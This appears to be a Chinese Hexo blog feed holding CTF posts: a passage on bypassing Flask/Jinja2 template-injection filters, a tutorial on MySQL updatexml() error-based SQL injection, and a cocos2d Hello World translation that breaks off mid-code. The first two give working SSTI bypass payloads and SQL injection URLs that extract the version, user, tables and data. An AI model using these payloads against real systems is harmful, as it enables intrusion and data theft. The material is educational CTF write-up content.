class="comment">#这个操作对字典与列表都适用</span></span><br></pre></td></tr></table></figure><p>来获取<code>__mro__</code>所得元组的最后一个元素和<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li><li><p>对于列表来,pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。我们可以用pop() 来代替中括号。里使用pop并不会真的移除,但却能返回其值,取代中括号,来实现绕过。例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__base__.__subclasses__().pop(<span class="number">40</span>)</span><br><span class="line"><span class="comment">#这个只能用于列表</span></span><br></pre></td></tr></table></figure><p>来获得<code>__subclasses__()</code>返回的列表里的索引为40的元素。</p></li><li><p>对于字典来说,可以用’.’号来代替.在flask中的<code></code>号里’.’号有代替<code>[ ]</code>对字典进行索引读取的作用.例如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">-1</span>).__subclasses__().__getitem__(<span class="number">79</span>).__init__.__globals__.__builtins__.ord</span><br><span class="line"><span class="comment">#这个只能用于字典</span></span><br></pre></td></tr></table></figure><p>来获得<code>__builtins__</code>返回的列表里的索引为’ord’的元素。</p></li></ol><h6 id="2-过滤双下划线"><a href="#2-过滤双下划线" class="headerlink" title="2)过滤双下划线"></a>2)过滤双下划线</h6><ol><li><p>request.args 是flask中的一个属性,为返回请求的参数,这里自己设置一个变量名,将后面的路径传值进来,进而绕过了’_’的过滤.</p><p>例如：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br></pre></td></tr></table></figure><p>通过自己设置变量class、x1、x2、x3来传递参数从而绕过。</p></li><li><p>同request.args，request.values也有类似的作用，不过要利用post的方式进行传参。</p></li><li><p>在<code>dir()</code>没有被ban下可以用<code>dir(0)[0][0]</code>来引入’_’.</p><p>例： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">'class'</span>+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]+dir(<span class="number">0</span>)[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#等价于''.__class__（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>利用格式化字符串特性。用<code>&#39;{0:c}&#39;[&#39;format&#39;](95)</code>或<code>&quot;%c&quot;%(95)</code></p><p>以<code>&#39;&#39;.__class__</code>例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>[<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'class'</span>+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)+<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure></li></ol><h6 id="3-过滤了’-’号"><a href="#3-过滤了’-’号" class="headerlink" title="3)过滤了’.’号"></a>3)过滤了’.’号</h6><ol><li><p>用中括号来代替。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class__'</span>]等价于<span class="string">''</span>.__class__</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>用<code>__getattribute__</code>函数来代替</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>用<code>attr()</code>函数来代替</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__class'</span>__]等价于<span class="string">''</span>|attr(<span class="string">'__class__'</span>)</span><br></pre></td></tr></table></figure></li></ol><h6 id="4-关键词字符过滤"><a href="#4-关键词字符过滤" class="headerlink" title="4)关键词字符过滤"></a>4)关键词字符过滤</h6><ol><li><p>利用字符串特性将关键词拆绕过。</p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__cl'</span>+<span class="string">'ass__'</span>]等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br><span class="line"><span class="string">''</span>.__getattribute__(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>)</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br><span class="line"><span class="string">''</span>[<span class="string">'__class'</span>__]等价于<span class="string">''</span>|attr(<span class="string">'__cla'</span>+<span class="string">'ss__'</span>)</span><br></pre></td></tr></table></figure></li><li><p>在<code>dir()</code>或<code>__dir__()</code>没有被ban下利用<code>dir()</code>或<code>__dir__()</code>返回值进行拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">18</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">4</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">1</span>][<span class="number">3</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">2</span>][<span class="number">2</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]+<span class="string">''</span>.__dir__()[<span class="number">0</span>][<span class="number">0</span>]]</span><br><span class="line"><span class="comment">#在我的环境中，等价于__class__</span></span><br><span class="line"><span class="comment">#''.__dir__()[0][0]=='_'</span></span><br><span class="line"><span class="comment">#''.__dir__()[18][2]==‘c’</span></span><br><span class="line"><span class="comment">#''.__dir__()[4][2]=='a'</span></span><br><span class="line"><span class="comment">#''.__dir__()[1][3]=='l'</span></span><br><span class="line"><span class="comment">#''.__dir__()[2][2]=='s'</span></span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>‘%c’.format()与’{0:c}’.format()拼接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">""</span>[<span class="string">'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">99</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">108</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">97</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">115</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)%<span class="number">2</span><span class="string">b'&#123;0:c&#125;'</span>[<span class="string">'format'</span>](<span class="number">95</span>)]&#125;&#125;等价于<span class="string">''</span>.__class__</span><br><span class="line"><span class="comment">#（PS：在url中'+'号最好要编码成%2b！！！）</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>进行decode解编码绕过。</p><p>例:1.进行base64处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'X19jbGFzc19f'</span>.decode(<span class="string">'base64'</span>)]</span><br></pre></td></tr></table></figure><p>例:2.进行16进制处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'5f5f636c6173735f5f'</span>.decode(<span class="string">'hex'</span>)]</span><br></pre></td></tr></table></figure><p>例:3.进行rot13 编码处理<code>__class__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'__pynff__'</span>.decode(<span class="string">'rot13'</span>)]</span><br></pre></td></tr></table></figure></li></ol><ol start="5"><li><p>利用request.args，request.values进行传参.</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request.args.class][request.args.x1][request.args.x2][request.args.x3]()[40]&#125;&#125;?class=__class__&amp;x1=__base__&amp;x2=__base__&amp;x3=__subclasses__</span><br></pre></td></tr></table></figure><p>若’.’也被过滤可以用’[]’套娃方式代替</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;""[request['args']['c']]&#125;&#125;?c=__class__</span><br></pre></td></tr></table></figure></li><li><p>利用全角符号来绕过字母过滤(大多数非字母字符不能绕过,python3环境?)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ｏｐｅｎ</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>&lt;function io.open(file, mode=<span class="string">'r'</span>, buffering=<span class="number">-1</span>, encoding=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>＿＿ｉｍｐｏｒｔ</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> File <span class="string">"&lt;ipython-input-2-78bf7df85c1c&gt;"</span>, line <span class="number">1</span></span><br><span class="line">    ＿＿ｉｍｐｏｒｔ</span><br><span class="line">           ^</span><br><span class="line">SyntaxError: invalid character <span class="keyword">in</span> identifier</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__ｉｍｐｏｒｔ__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> &lt;function __import__&gt;</span><br></pre></td></tr></table></figure><p>7.利用模板渲染编码绕过：（部分版本）</p><p>​     7.1：16进制（<code>\xXX</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'\x5F\x5F\x63\x6C\x61\x73\x73\x5F\x5F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><p>​     7.2：8进制（<code>\OOO</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>[<span class="string">'\137\137\143\154\141\163\163\137\137'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure><p>​     7.3：unicode（<code>\uXXXX</code>or<code>\UXXXXXXXX</code>）绕过。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\uXXXX:</span><br><span class="line">    <span class="string">''</span>[<span class="string">'\u005F\u005F\u0063\u006C\u0061\u0073\u0073\u005F\u005F'</span>]  <span class="comment">#''.__class__</span></span><br><span class="line">\UXXXXXXXX:</span><br><span class="line">    <span class="string">''</span>[<span class="string">'\U0000005F\U0000005F\U00000063\U0000006C\U00000061\U00000073\U00000073\U0000005F\U0000005F'</span>]  <span class="comment">#''.__class__</span></span><br></pre></td></tr></table></figure></li></ol><h6 id="5-过滤了‘-’or‘-’"><a href="#5-过滤了‘-’or‘-’" class="headerlink" title="5)过滤了‘{ {’or‘} }’"></a>5)过滤了‘{ {’or‘} }’</h6><p>可以用<code>{ % % }</code>来代替<code>{ {} }</code>，但要注意两者区别： <code>{ {} }</code>是用来变量取值，<code>{ { % % } }</code>是用来控制结构。 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">'1'</span>==<span class="string">'code'</span> %&#125;lexsD6&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h2 id="0x0参考文献"><a href="#0x0参考文献" class="headerlink" title="0x0参考文献"></a>0x0参考文献</h2><p>1.<a href="https://blog.csdn.net/answer3lin/article/details/86572575" target="_blank" rel="noopener">https://blog.csdn.net/answer3lin/article/details/86572575</a></p><p>2.<a href="https://docs.python.org/zh-cn/3/" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/</a></p><p>3.<a href="https://www.anquanke.com/post/id/188172#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188172#h3-2</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于updatexml()报错注入的思考</title>
      <link href="/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01updatexml-的正常作用"><a href="#0x01updatexml-的正常作用" class="headerlink" title="0x01updatexml()的正常作用"></a>0x01updatexml()的正常作用</h2><p>updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<a id="more"></a>其正常语法：<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>如下是关于它正常用法的掩饰。</p><p>(1)执行如下sql语言创建环境：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexsd6&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;frist xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第一个数据</span><br><span class="line">INSERT INTO xml1 VALUES</span><br><span class="line">(&#39;</span><br><span class="line">&lt;values&gt; </span><br><span class="line">&lt;name&gt;lexs&lt;&#x2F;name&gt;</span><br><span class="line">&lt;text&gt;secend xml date&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;values&gt;&#39;);#插入第二个数据</span><br></pre></td></tr></table></figure><p>(2) 使用<code>select * from xml1</code>查看</p><p><img src="iamge-updatexml1.png" alt="updatexml1"></p><p>（3）执行<code>SELECT updatexml(title,&#39;/values/text&#39;,&#39;one&#39;) FROM xml1;</code>语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。</p><p><img src="image-20200320235648716.png" alt="image-20200320235648716"></p><h2 id="0x02updatexml-报错注入的原因及注意点"><a href="#0x02updatexml-报错注入的原因及注意点" class="headerlink" title="0x02updatexml()报错注入的原因及注意点"></a>0x02updatexml()报错注入的原因及注意点</h2><p>由于updatexml的第二个参数需要<u><strong>Xpath</strong></u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.</p><p>例如:执行sql语句<code>select updatexml(1,concat(0x7e,(select database()),0x7e),1);</code>后,可以看到回显:</p><p><img src="image-20200321131351700.png" alt="image-20200321131351700"></p><p>如上图,原本<code>select database()</code>的地方被执行了,显示出数据库名–bookshop.</p><p>在这里要注意的事：</p><p>(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。</p><p>(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat(‘不符合Xpath格式的字符串’,’要执行的恶意sql语句’)来构造’’</p><p><img src="image-20200321002711168.png" alt="image-20200321002711168"></p><p>(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:</p><p><img src="image-20200321160707020.png" alt="image-20200321160707020"></p><p>(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.</p><p><img src="image-20200321161640552.png" alt="image-20200321161640552"></p><p>so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)</p><p><img src="image-20200324151215694.png" alt="image-20200324151215694"></p><h2 id="0x03updatexml-的注入"><a href="#0x03updatexml-的注入" class="headerlink" title="0x03updatexml()的注入"></a>0x03updatexml()的注入</h2><p>(1.)爆数据库版本信息</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#</p><p>(2.)爆出用户</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#</p><p>(3.)爆出所用数据库</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#</p><p>(4.)爆全部数据库</p><p><a href="http://www.hackblog.cn/sql.php?id=1" target="_blank" rel="noopener">http://www.hackblog.cn/sql.php?id=1</a> and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#</p><p>(5.)爆表<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#</p><p>(6.)爆字段</p><p><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name=’xml1’ limit 0,1),0x7e),1);#</p><p>(7.)爆字段内容<br><a href="http://127.0.0.1/sql.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql.php?id=1</a> and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cocos2d官方文档汉化--Writing a cocos2d application</title>
      <link href="/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/"/>
      <url>/2019/04/10/cocos2d%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E6%B1%89%E5%8C%96--Writing%20a%20cocos2d%20application/</url>
      
        <content type="html"><![CDATA[<p>在开始使用一个新的库或框架是很困难的，尤其是在有大量参考文献要阅读的情况下。虽然会忽略掉一些细节，但这篇文章将用很简洁快速地介绍cocos2d。<a id="more"></a></p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World"></a>Hello, World</h2><p>我们将从必要的“Hello, World”来开始介绍，这个例子将打开一个带有一些文字在上面的窗口并且在等待一段时间后会关闭这个窗口。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>通过导入cocos库开始：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cocos</span><br></pre></td></tr></table></figure><p>建立一个<code>Layer</code>（层）的子类，并定义在这里编写定义你的逻辑代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span><span class="params">(cocos.layer.Layer)</span>:</span></span><br></pre></td></tr></table></figure><p>我们可以在构造函数中通过<code>super()</code>来继承调用父类。从而总是在构造函数中调用<code>super()</code>来继承<code>Layer</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">    super(HelloWorld, self).__init__()</span><br></pre></td></tr></table></figure><p>为了设置展现文本，我们将通过<code>cocos.text.Label()</code>创建一个<code>Label</code>（标签）. <code>cocos.text.Label</code>的关键参数有font_name(自定义字体)、font_size(字体大小)、anchr_x(字体的x轴描点)、anchr_y(字体的y轴描点)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">label = cocos.text.Label(</span><br><span class="line">    <span class="string">'Hello, world'</span>,</span><br><span class="line">    font_name=<span class="string">'Times New Roman'</span>,</span><br><span class="line">    font_size=<span class="number">32</span>,</span><br><span class="line">    anchor_x=<span class="string">'center'</span>, anchor_y=<span class="string">'center'</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>通过对<code>label.position</code>赋值让label在窗口的中心显现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label.position = <span class="number">320</span>, <span class="number">240</span></span><br></pre></td></tr></table></figure><p>由于<code>Label</code>是<code>CocosNode</code>的子类，Label能被添加在<code>CocosNode</code>作为子节点。所有的<code>CocosNode</code>对象能知道如何渲染、执行、转换他们。让我们为通过<code>add()</code>为<code>Layer</code>添加一个子节点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.add(label)</span><br></pre></td></tr></table></figure><p>之后为了定义<code>HelloWorld</code>类，我们需要初始化和创建一个窗口。我们在<code>Director</code>进行初始化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cocos.director.director.init()</span><br></pre></td></tr></table></figure><p>之后我们创造一个<code>HelloWorld</code>类的实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello_layer = HelloWorld()</span><br></pre></td></tr></table></figure><p>再之后我们创建一个包含图层实例(hello_layer)的scene(场景)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_scene = cocos.scene.Scene (hello_layer)</span><br></pre></td></tr></table></figure><p>最后我们运行这个场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cocos.director.director.run(main_scene)</span><br></pre></td></tr></table></figure><p>最好三步操作也可以简化为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cocos.director.director.run(cocos.scene.Scene(HelloWorld()))</span><br></pre></td></tr></table></figure><h3 id="样例代码"><a href="#样例代码" class="headerlink" title="样例代码"></a>样例代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cocos</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span><span class="params">(cocos.layer.Layer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment">#继承调用cocos.layer.Layer父类的构造方法，来创建一个图层</span></span><br><span class="line">        super(HelloWorld, self).__init__()</span><br><span class="line">        <span class="comment">#设置展现文本</span></span><br><span class="line">        label = cocos.text.Label(</span><br><span class="line">            <span class="string">'Hello, world'</span>,</span><br><span class="line">            font_name=<span class="string">'Times New Roman'</span>,</span><br><span class="line">            font_size=<span class="number">32</span>,</span><br><span class="line">            anchor_x=<span class="string">'center'</span>, anchor_y=<span class="string">'center'</span>)</span><br><span class="line">        <span class="comment">#设置label的位置</span></span><br><span class="line">        label.position = <span class="number">0</span>, <span class="number">240</span></span><br><span class="line">        <span class="comment">#将文本添加在图层中</span></span><br><span class="line">        self.add(label)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    cocos.director.director.init()<span class="comment">#实例化directir 进行初始化</span></span><br><span class="line">    hello_layer = HelloWorld()<span class="comment">#实例化HelloWorld class</span></span><br><span class="line">    main_scene = cocos.scene.Scene (hello_layer)<span class="comment">#让场景包含图层</span></span><br><span class="line">    cocos.director.director.run(main_scene)<span class="comment">#运行显示场景</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Hello-Actions"><a href="#Hello-Actions" class="headerlink" title="Hello Actions"></a>Hello Actions</h2><p>这个例子和之前的例子1有点类似，不过不同之处在于它向我们展示了运动的世界。运动就像是命令，我们可以命令所有<code>CocosNode object</code>去执行一个动作，</p><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h3><p>比如想我们的例子，我们import package：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cocos</span><br></pre></td></tr></table></figure><p>如果你想进行多个操作，你可以将命令空间导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cocos.actions <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure><p>我们可以通过创建一个<code>ColorLayer</code>的子类来创建一个有色彩的图层，并且通过super函数来设置颜色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span><span class="params">(cocos.layer.ColorLayer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># blueish color</span></span><br><span class="line">        super( HelloWorld, self ).__init__( <span class="number">64</span>,<span class="number">64</span>,<span class="number">224</span>,<span class="number">255</span>)</span><br></pre></td></tr></table></figure><p>与之前的例子相同，我们创造一个标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 